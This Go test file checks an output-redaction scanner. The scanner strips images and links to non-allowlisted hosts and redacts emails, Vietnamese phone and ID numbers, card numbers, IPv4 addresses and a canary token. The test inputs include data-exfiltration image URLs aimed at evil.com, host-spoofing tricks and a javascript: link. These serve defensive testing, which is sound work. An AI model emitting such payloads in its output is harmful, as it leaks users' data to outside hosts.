package outputguard

import (
	"strings"
	"testing"
)

const testCanary = "PS-CANARY-0123456789ABCDEF01234567"

func scanner(cfg Config) *Scanner {
	return New(cfg).ForRequest(testCanary)
}

var full = Config{RedactPII: true, RedactIPv4: true, Canary: CanaryRedact}

type detectorCase struct {
	name  string
	in    string
	want  string
	kinds Counts
}

func runCases(t *testing.T, cfg Config, cases []detectorCase) {
	t.Helper()
	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			counts := Counts{}
			got := scanner(cfg).Text(tt.in, counts)
			if got != tt.want {
				t.Errorf("got  %q\nwant %q", got, tt.want)
			}
			if tt.kinds == nil {
				tt.kinds = Counts{}
			}
			for k, v := range tt.kinds {
				if counts[k] != v {
					t.Errorf("count %s = %d, want %d (all %v)", k, counts[k], v, counts)
				}
			}
			if counts.Total() != tt.kinds.Total() {
				t.Errorf("counts = %v, want %v", counts, tt.kinds)
			}
		})
	}
}

func TestLinksAndImages(t *testing.T) {
	cfg := Config{LinkAllowlist: []string{"docs.example.com", "Trusted.org"}}
	runCases(t, cfg, []detectorCase{
		{"plain text", "hello world", "hello world", nil},
		{"image stripped", "see ![chart](https://evil.com/c.png?d=secret) now",
			"see [REDACTED:image] now", Counts{KindImage: 1}},
		{"image to allowlisted host stays", "![a](https://docs.example.com/a.png)",
			"![a](https://docs.example.com/a.png)", nil},
		{"image to subdomain of allowlisted host stays", "![a](https://cdn.trusted.org/a.png?x=1)",
			"![a](https://cdn.trusted.org/a.png?x=1)", nil},
		{"lookalike host is not allowlisted", "![a](https://docs.example.com.evil.com/a.png)",
			"[REDACTED:image]", Counts{KindImage: 1}},
		{"userinfo trick", "![a](https://docs.example.com@evil.com/a.png)",
			"[REDACTED:image]", Counts{KindImage: 1}},
		{"relative image", "![a](/a.png)", "[REDACTED:image]", Counts{KindImage: 1}},
		{"image with title", `![a](https://evil.com/x.png "t")`, "[REDACTED:image]", Counts{KindImage: 1}},
		{"image url with parentheses", "![a](https://evil.com/a(b)?q=1)", "[REDACTED:image]", Counts{KindImage: 1}},
		{"angle bracket url", "![a](<https://evil.com/a.png>)", "[REDACTED:image]", Counts{KindImage: 1}},
		{"link keeps its text", "read [the docs](https://evil.com/?q=x) please",
			"read the docs please", Counts{KindLink: 1}},
		{"allowlisted link stays", "[docs](https://docs.example.com/p)", "[docs](https://docs.example.com/p)", nil},
		{"javascript link", "[x](javascript:alert(1))", "x", Counts{KindLink: 1}},
		{"reference definition", "![a][r]\n[r]: https://evil.com/p.png?q=1\nend",
			"![a][r]\n\nend", Counts{KindLink: 1}},
		{"html image", `<img src="https://evil.com/p.gif?d=1" alt="x">`, "[REDACTED:image]", Counts{KindImage: 1}},
		{"html image allowlisted", `<img src="https://docs.example.com/p.gif">`,
			`<img src="https://docs.example.com/p.gif">`, nil},
		{"bare image url with query", "go to https://evil.com/p.png?d=secret ok",
			"go to [REDACTED:url] ok", Counts{KindURL: 1}},
		{"bare image url without query stays", "https://evil.com/p.png", "https://evil.com/p.png", nil},
		{"bare page url stays", "https://evil.com/page?d=1", "https://evil.com/page?d=1", nil},
		{"tail of a link split from its text", "](https://evil.com/x.png?q=1)", "]", Counts{KindLink: 1}},
	})
}

func TestEmptyAllowlistStripsAllImagesAndLinks(t *testing.T) {
	runCases(t, Config{}, []detectorCase{
		{"image", "![a](https://docs.example.com/a.png)", "[REDACTED:image]", Counts{KindImage: 1}},
		{"link", "[docs](https://docs.example.com)", "docs", Counts{KindLink: 1}},
		{"pii untouched when off", "mail a@b.com", "mail a@b.com", nil},
	})
}

func TestPII(t *testing.T) {
	runCases(t, full, []detectorCase{
		{"email", "write to nguyen.van.a+x@mail.example.vn today",
			"write to [REDACTED:email] today", Counts{KindEmail: 1}},
		{"not an email", "a @ b and foo@bar", "a @ b and foo@bar", nil},
		{"mobile 0", "call 0912345678.", "call [REDACTED:phone].", Counts{KindPhone: 1}},
		{"mobile spaced", "call 091 234 5678", "call [REDACTED:phone]", Counts{KindPhone: 1}},
		{"mobile +84", "call +84 912 345 678 now", "call [REDACTED:phone] now", Counts{KindPhone: 1}},
		{"mobile +84 compact", "+84912345678", "[REDACTED:phone]", Counts{KindPhone: 1}},
		{"mobile dotted", "0912.345.678", "[REDACTED:phone]", Counts{KindPhone: 1}},
		{"landline", "office 02838123456", "office [REDACTED:phone]", Counts{KindPhone: 1}},
		{"phone after a number", "room 12 0912345678", "room 12 [REDACTED:phone]", Counts{KindPhone: 1}},
		{"too many digits is not a phone", "09123456789999", "09123456789999", nil},
		{"wrong prefix", "0112345678", "0112345678", nil},
		{"cccd", "CCCD: 001203004567", "CCCD: [REDACTED:cccd]", Counts{KindCCCD: 1}},
		{"12 digits not starting with 0", "order 123456789012", "order 123456789012", nil},
		{"13 digits is not cccd", "0012030045671", "0012030045671", nil},
		{"visa", "card 4111 1111 1111 1111 exp", "card [REDACTED:card] exp", Counts{KindCard: 1}},
		{"visa compact", "4111111111111111", "[REDACTED:card]", Counts{KindCard: 1}},
		{"mastercard dashed", "5555-5555-5555-4444", "[REDACTED:card]", Counts{KindCard: 1}},
		{"amex", "3782 822463 10005", "[REDACTED:card]", Counts{KindCard: 1}},
		{"card followed by a year", "4111 1111 1111 1111 2030", "[REDACTED:card] 2030", Counts{KindCard: 1}},
		{"luhn failure", "4111 1111 1111 1112", "4111 1111 1111 1112", nil},
		{"ipv4", "host 192.168.1.20:80", "host [REDACTED:ipv4]:80", Counts{KindIPv4: 1}},
		{"version is not ipv4", "v1.2.3.4.5", "v1.2.3.4.5", nil},
		{"bad octet", "300.1.1.1", "300.1.1.1", nil},
		{"several", "a@b.co 0912345678", "[REDACTED:email] [REDACTED:phone]",
			Counts{KindEmail: 1, KindPhone: 1}},
		{"vietnamese text around", "Số điện thoại: 0987654321, cảm ơn",
			"Số điện thoại: [REDACTED:phone], cảm ơn", Counts{KindPhone: 1}},
	})
}

func TestIPv4IsOptional(t *testing.T) {
	runCases(t, Config{RedactPII: true}, []detectorCase{
		{"ipv4 kept", "10.0.0.1", "10.0.0.1", nil},
	})
}

func TestCanary(t *testing.T) {
	runCases(t, full, []detectorCase{
		{"canary", "the marker is " + testCanary + ".", "the marker is [REDACTED:canary].",
			Counts{KindCanary: 1}},
		{"canary in an image still counts", "![x](https://evil.com/a.png?c=" + testCanary + ")",
			"[REDACTED:image]", Counts{KindImage: 1, KindCanary: 1}},
		{"canary in link text", "[" + testCanary + "](https://evil.com)", "[REDACTED:canary]",
			Counts{KindLink: 1, KindCanary: 1}},
	})
	// With the canary off, the token is not looked for.
	off := New(Config{}).ForRequest(testCanary)
	if got := off.Text(testCanary, Counts{}); got != testCanary {
		t.Errorf("canary off: %q", got)
	}
}

func TestNewCanaryIsRandom(t *testing.T) {
	a, err := NewCanary()
	if err != nil {
		t.Fatal(err)
	}
	b, _ := NewCanary()
	if a == b || !strings.HasPrefix(a, "PS-CANARY-") || len(a) > 64 {
		t.Errorf("canaries %q %q", a, b)
	}
}

func TestLuhn(t *testing.T) {
	for in, want := range map[string]bool{
		"4111111111111111": true, "4111111111111112": false,
		"6011111111111117": true, "371449635398431": true, "1234567890123": false,
	} {
		if luhn(in) != want {
			t.Errorf("luhn(%s) != %v", in, want)
		}
	}
}
